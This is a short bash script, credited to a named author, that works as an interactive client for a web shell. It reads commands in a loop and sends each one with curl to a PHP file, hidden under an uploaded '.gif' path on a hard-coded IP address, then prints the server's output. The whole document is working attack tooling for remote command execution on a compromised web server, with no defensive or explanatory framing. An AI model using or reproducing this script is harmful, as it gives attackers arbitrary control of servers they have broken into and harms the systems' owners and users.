#!/bin/bash
# Author : Yanis Alim
while :; do
	read -r -e -p "$ " cmd; history -s "$cmd"
	curl -s "132.227.89.21/uploads/andfHUhR3xdfQPpasRGUusqC2Fkz1dJ4.gif/x.php?cmd=echo;$cmd" | tail -n +3
done
